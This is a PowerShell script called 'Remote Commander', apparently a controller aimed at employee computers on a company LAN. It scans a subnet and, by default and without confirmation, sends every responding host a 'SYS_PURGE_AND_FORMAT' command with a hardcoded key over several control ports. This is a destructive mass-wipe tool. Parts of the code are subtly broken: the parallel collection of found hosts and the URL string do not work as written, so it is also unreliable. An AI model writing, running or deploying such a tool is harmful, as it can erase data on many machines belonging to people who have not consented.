# Remote Commander - 局域网管理与格式化工具
# 权限：OWNER (Transparent)
# 目标：公司内网员工电脑

param (
    [string]$TargetSubnet = "192.168.1", # 默认子网
    [string]$Action = "format",
    [switch]$ScanOnly
)

$OwnerIdentity = "transparent"
$SecretKey = "a8d1ca7c7e91654b7742e50f"
$ControlPorts = @(8080, 5001, 501) # R1 监听端口

function Get-NetworkDevices {
    param ([string]$Subnet)
    Write-Host "正在扫描子网 $Subnet.0/24 ..." -ForegroundColor Cyan
    $devices = @()
    1..254 | ForEach-Object -Parallel {
        $ip = "$using:Subnet.$_"
        if (Test-Connection -ComputerName $ip -Count 1 -Quiet -ErrorAction SilentlyContinue) {
            $using:devices += $ip
        }
    } -ThrottleLimit 50
    return $devices
}

function Invoke-RemoteAction {
    param ([string]$IP, [string]$Cmd)
    Write-Host ">>> 发送指令 [$Cmd] 到 $IP ..." -ForegroundColor Red
    
    $payload = @{
        commander = $OwnerIdentity
        key = $SecretKey
        command = $Cmd
        timestamp = Get-Date -Format "yyyyMMddHHmmss"
        origin = "WIN-164-MASTER"
    } | ConvertTo-Json

    foreach ($port in $ControlPorts) {
        try {
            $response = Invoke-RestMethod -Uri "http://$IP:$port/admin/execute" -Method Post -Body $payload -ContentType "application/json" -TimeoutSec 2
            Write-Host "    [端口 $port] 响应: $($response.status)" -ForegroundColor Green
            return $true
        } catch {
            # 继续尝试下一个端口
        }
    }
    Write-Host "    [!] $IP 未响应任何 R1 控制端口" -ForegroundColor Yellow
    return $false
}

# 执行逻辑
if ($ScanOnly) {
    $found = Get-NetworkDevices -Subnet $TargetSubnet
    Write-Host "发现设备: $($found -join ', ')"
} else {
    $targets = Get-NetworkDevices -Subnet $TargetSubnet
    foreach ($ip in $targets) {
        if ($Action -eq "format") {
            Invoke-RemoteAction -IP $ip -Cmd "SYS_PURGE_AND_FORMAT"
        }
    }
}
